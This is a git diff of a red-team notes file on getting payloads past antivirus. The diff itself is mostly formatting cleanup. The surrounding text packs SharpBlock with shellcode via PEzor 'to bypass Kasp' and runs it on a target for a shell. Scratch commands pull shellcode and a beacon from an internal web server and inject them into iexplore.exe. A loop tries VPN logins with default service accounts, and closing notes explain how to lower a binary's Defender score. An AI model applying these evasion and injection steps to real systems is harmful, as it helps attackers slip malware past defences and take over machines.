@@ -43,7 +43,8 @@ Winning combo : SharpBlock + PEzor (bypass Kasp for the moment..)
   ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 SharpBlock.exe -p '-e <SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
   ```
 5. Setup your launcher (and webserver), and execute the packed binary file from the target
-6. Be patient (around 5minn depending on the sleep argument set), get your shell and enjoy
+
+6. Be patient (around 5min depending on the sleep argument set), get your shell and enjoy
 
 > SharpBlock can load a shellcode from a webserver, or locally. To get rid of the webserver, you can directly drop the two binaries to the target (packed SharpBlock and packed shellcode) but do not execute the packed shellcode directly or you might get caught by the AV. You only need to execute the packed SharpBlock binary (which will inject the packed shellcode directly into memory).
 
@@ -91,7 +92,7 @@ To restrict the Windows VM traffic to the C2 server only (we don't want our payl
   WANIF=enp0s3
   LANIF=enp0s8
   # IPs to allow
-  IP1=<IP_adress_to_allow>
+  IP_ALLOWED=<IP_adress_to_allow>
   echo "flushing iptables..."
   sudo iptables -F
   sudo iptables -X
@@ -99,17 +100,16 @@ To restrict the Windows VM traffic to the C2 server only (we don't want our payl
   sudo iptables -t nat -X
   sudo iptables -t mangle -F
   sudo iptables -t mangle -X
-  echo "setting restrictive router..."
-  # ssh for the vm
+  # allow ssh on vm
   sudo iptables -A INPUT -i $LANIF -p tcp --dport 22 -j ACCEPT
   # masquerade
   sudo iptables -A POSTROUTING -t nat -o $WANIF -j MASQUERADE
   sudo iptables -A FORWARD -i $WANIF -m state --state ESTABLISHED,RELATED -j ACCEPT
   # Allow ping on target
-  sudo iptables -A FORWARD -i $LANIF -p icmp -d $IP1 -j ACCEPT
+  sudo iptables -A FORWARD -i $LANIF -p icmp -d $IP_ALLOWED -j ACCEPT
   # Allow <LISTENER_PORT> on target
-  sudo iptables -A FORWARD -i $LANIF -p tcp --dport <LISTENER_PORT> -d $IP1 -j ACCEPT
-  # Drop the rest bitch
+  sudo iptables -A FORWARD -i $LANIF -p tcp --dport <LISTENER_PORT> -d $IP_ALLOWED -j ACCEPT
+  # Drop the rest
   sudo iptables -P INPUT DROP
   sudo iptables -P FORWARD DROP
   sudo iptables -P OUTPUT DROP
@@ -120,13 +120,14 @@ To restrict the Windows VM traffic to the C2 server only (we don't want our payl
   ```
 7. Configure the Windows VM (Host-Only network interface) to use the linux VM as his gateway (set static IP address).
 8. For DNS you can add the association into the file : `C:\Windows\System32\drivers\etc\hosts`
-9. Test your payloads and enjoy your shells :+1:
+9. Test your payloads and enjoy your shells !
 
 ---
 
 ### Automated testing 
 
 CI Pipeline
+
 **todo**
 
 ---
@@ -143,9 +144,7 @@ C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.2
 
 ### Fix Pezor
 
-Fixed by author. To check :
-
-[Inline syscall old version](https://github.com/phra/PEzor/commit/531095695f56b7ab3add7c9c154ebce830e534a7)
+Fixed by author. check : [Inline syscall old version](https://github.com/phra/PEzor/commit/531095695f56b7ab3add7c9c154ebce830e534a7)
 
 
 ---
@@ -156,15 +155,15 @@ Fixed by author. To check :
 for i in `cat /tmp/default_users_for_services_unhash.txt` ; do /opt/vpn_connect -u $i -p a -l /tmp/$i;done
 
 copy \\192.168.56.200\tiki\processinjectionn.zip C:\Users\wee\
-copy  C:\Users\wee\processinjectionn\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe \\192.168.56.200\tiki\
+copy C:\Users\wee\processinjectionn\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe \\192.168.56.200\tiki\
 
 ProcessInjection.exe.packed.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:C:\program files\internet explorer\iexplore.exe /pid:7368 /t:4
 ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:C:\program files\internet explorer\iexplore.exe /pid:7368 /t:4
 ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:"C:\program files\internet explorer\iexplore.exe" /pid:4928 /t:3
 ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/longhaul/longhaul_beacon/beacon64.bin.sgn /ppath:"C:\program files\internet explorer\iexplore.exe" /t:3
 
->cd "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29333\bin\Hostx64\x64>"
-> copy Bin\wraith_x64_encoded.bin \\192.168.56.200\tiki\
+cd "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29333\bin\Hostx64\x64>"
+copy Bin\wraith_x64_encoded.bin \\192.168.56.200\tiki\
 
 ```
 
@@ -181,6 +180,7 @@ Every file has a score that gets involved in triggering one of the three differe
 
 #### 1. Rule-based
 Content in the binary that matchs analyst definition of known bad :
+
 - obfuscate functions and string from offense code
 - obfuscate base64 encoded dll or shellcode
 - change decryption key
@@ -188,14 +188,15 @@ Content in the binary that matchs analyst definition of known bad :
 
 #### 2. Heuristics
 Properties of the binary to find suspicious things :
-  - compile time
-  - compiler (Windows => good or Linux => not good for WinDef)
-  - import table
-  - metadata resources (name, icon, absence of this)
-  - signed or not
-  - entropy 
-  - take metadata from existing program
-  - import table shellcode injection 
+
+- compile time
+- compiler (Windows => good or Linux => not good for WinDef)
+- import table
+- metadata resources (name, icon, absence of this)
+- signed or not
+- entropy
+- take metadata from existing program
+- import table shellcode injection 
 
 #### 3. Correlation
 - append known good program to get good score
